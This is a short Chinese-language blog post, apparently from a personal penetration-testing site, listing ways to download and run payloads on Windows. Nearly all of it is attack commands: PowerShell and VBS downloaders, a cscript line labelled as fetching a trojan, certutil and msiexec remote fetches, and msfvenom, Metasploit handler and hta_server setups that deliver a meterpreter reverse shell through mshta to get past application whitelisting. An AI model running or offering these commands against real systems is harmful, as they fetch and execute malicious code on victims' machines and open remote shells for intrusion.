{"title":"Windows下载payload的一些方式","slug":"2019-04-30-Windows下载payload的一些方式","date":"2019-10-19T09:56:50.000Z","updated":"2019-10-21T15:48:19.215Z","comments":true,"excerpt":"","content":"<h5 id=\"PowerShell下载\"><a href=\"#PowerShell下载\" class=\"headerlink\" title=\"PowerShell下载\"></a>PowerShell下载</h5><pre><code>powershell &quot;$c=new-Object \\&quot;System.Net.WebClient\\&quot;;$c.DownloadFile(\\&quot;http://123.207.xx.xx:81/static/lcx.exe\\&quot;,\\&quot;C:/Users/Administrator/Desktop/lcx.exe\\&quot;);&quot;;(下载路径必须是完整的绝对路径)\n</code></pre><h5 id=\"VBS下载\"><a href=\"#VBS下载\" class=\"headerlink\" title=\"VBS下载\"></a>VBS下载</h5><pre><code>echo iLocal = LCase(WScript.Arguments(1)) &gt; 1.vbs\necho iRemote = LCase(WScript.Arguments(0)) &gt;&gt; 1.vbs\necho Set xPost = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; 1.vbs\necho xPost.Open &quot;GET&quot;,iRemote,0 &gt;&gt; 1.vbs\necho xPost.Send() &gt;&gt; 1.vbs\necho Set sGet = CreateObject(&quot;ADODB.Stream&quot;) &gt;&gt; 1.vbs\necho sGet.Mode = 3 &gt;&gt; 1.vbs\necho sGet.Type = 1 &gt;&gt; 1.vbs\necho sGet.Open() &gt;&gt; 1.vbs\necho sGet.Write(xPost.responseBody) &gt;&gt; 1.vbs\necho sGet.SaveToFile iLocal,2 &gt;&gt; 1.vbs\n</code></pre><p>执行命令下载木马：</p>\n<pre><code>cscript http://xx.xxx.xx.xx/1.exe 1.exe\n</code></pre><h5 id=\"certutil-exe下载\"><a href=\"#certutil-exe下载\" class=\"headerlink\" title=\"certutil.exe下载\"></a>certutil.exe下载</h5><pre><code>certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt\n</code></pre><h5 id=\"Msiexec下载\"><a href=\"#Msiexec下载\" class=\"headerlink\" title=\"Msiexec下载\"></a>Msiexec下载</h5><pre><code>msiexec /q /i http://192.168.1.115/robots.txt\n</code></pre><h5 id=\"mshta-绕过白名单\"><a href=\"#mshta-绕过白名单\" class=\"headerlink\" title=\"mshta(绕过白名单)\"></a>mshta(绕过白名单)</h5><h6 id=\"msfvenom生成hta\"><a href=\"#msfvenom生成hta\" class=\"headerlink\" title=\"msfvenom生成hta\"></a>msfvenom生成hta</h6><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=xx.xx.xx.xx lport=6666 -f hta-psh &gt; shell.hta\n</code></pre><p>metasploit监听：</p>\n<pre><code>use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset lhost xx.xx.xx.xx\nset lport 6666\n</code></pre><p>执行hta文件：</p>\n<pre><code>mshta.exe http://xx.xx.xx.xx/shell.hta\n</code></pre><p><img src=\"C:\\Users\\fanxing\\fanxinglove.github.io\\public\\img\\4.30\\2.png\" alt></p>\n<h6 id=\"mestasploit生成hta下载路径\"><a href=\"#mestasploit生成hta下载路径\" class=\"headerlink\" title=\"mestasploit生成hta下载路径\"></a>mestasploit生成hta下载路径</h6><p>msf生成代码：</p>\n<pre><code>use exploit/windows/misc/hta_server\nset payload windows/meterpreter/reverse_tcp\nset lhost xx.xx.xx.xx\nset lport 6666\n</code></pre><p>mshta.exe执行hta</p>\n<pre><code>mshta.exe http://xx.xx.xx.xx/pKz4Kk059Nq9.hta\n</code></pre><p><img src=\"C:\\Users\\fanxing\\fanxinglove.github.io\\public\\img\\4.30\\1.png\" alt></p>\n","categories":[],"tags":[]}